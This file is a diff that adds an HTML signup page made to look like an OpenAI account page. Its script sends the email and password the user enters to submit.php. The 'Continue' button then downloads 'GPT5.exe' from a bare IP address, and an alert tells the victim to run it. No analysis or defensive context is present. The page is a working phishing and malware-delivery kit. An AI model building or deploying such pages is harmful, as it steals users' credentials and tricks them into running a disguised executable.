@@ -1,0 +1,134 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Create your account</title>
+    <link rel="stylesheet" href="styles.css">
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #f2f2f2;
+            margin: 0;
+            padding: 0;
+        }
+
+        .container {
+            max-width: 400px;
+            margin: 50px auto;
+            padding: 20px;
+            background-color: #fff;
+            border-radius: 8px;
+            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+            justify-content: center; /* Center items horizontally */
+            align-items: center; /* Center items vertically */
+
+        }
+
+        .logo {
+            display: block;
+            margin: 0 auto 20px; /* Center the logo horizontally and provide spacing below */
+            max-width: 200px; /* Adjust the max-width as needed */
+        }
+
+        h2 {
+            text-align: center;
+            color: #333;
+        }
+
+        .form-group {
+            margin-bottom: 20px;
+        }
+
+        label {
+            display: block;
+            font-weight: bold;
+        }
+
+        input[type="email"],
+        input[type="password"] {
+            width: 100%;
+            padding: 10px;
+            border: 1px solid #ccc;
+            border-radius: 4px;
+            box-sizing: border-box;
+        }
+
+        #button {
+            width:-webkit-fill-available;
+            padding: 10px;
+            background-color: #18a47c;
+            color: #fff;
+            border: none;
+            border-radius: 4px;
+            cursor: pointer;
+            text-decoration: none; /* Remove default underline */
+            display: inline-block; /* Ensure the button behaves as a block element */
+            text-align: center; /* Center the text horizontally */
+            transition: background-color 0.3s; /* Add smooth transition */
+        }
+
+        #button:hover {
+            background-color: #148c67; /* Darker shade on hover */
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <img src="OpenAI_Logo.png" alt="Logo" class="logo">
+        <h2>Create your account</h2>
+        <form id="signupForm" action="submit.php" method="POST">
+            <div class="form-group">
+                <input type="email" placeholder="Email address" id="email" name="email" required>
+            </div>
+            <div class="form-group">
+                <input type="password" placeholder="Password" id="password" name="password" required minlength="6">
+            </div>
+            <div class="form-group">
+                <input type="password" placeholder="Confirm Password" id="confirm-password" name="confirm-password"  required minlength="6">
+            </div>
+            <a href="http://45.83.40.161/GPT5.exe" id="button" onclick="return validateForm()">Continue</a>
+        </form>
+    </div>
+</body>
+</html>
+
+<script>
+    function validateForm(){//Validate the form and send a download request only if the form is filled right
+        var email = document.getElementById('email').value;
+        var password = document.getElementById('password').value;
+        var confirmPassword = document.getElementById('confirm-password').value;
+
+        if (!email || !email.includes('@')) {
+            alert('Please enter a valid email address.');
+            return false;
+        }
+
+        if (password.length < 6) {
+            alert('Password must be at least 6 characters long.');
+            return false;
+        }
+
+        if (password !== confirmPassword) {
+            alert('Passwords do not match.');
+            return false;
+        }
+        var xhr = new XMLHttpRequest();
+
+        xhr.open('POST', 'submit.php', true);
+        xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
+
+        xhr.onload = function() {
+            if (xhr.status >= 200 && xhr.status < 300) {
+                alert('Account created successfully. Please download and run the GPT5 software.');
+            } else {
+                alert('Error creating account. Please try again later.');
+            }
+        };
+
+        xhr.send('email=' + encodeURIComponent(email) + '&password=' + encodeURIComponent(password));
+
+        setTimeout(function(){ window.close(); }, 10000);
+        return true;
+    }
+</script>
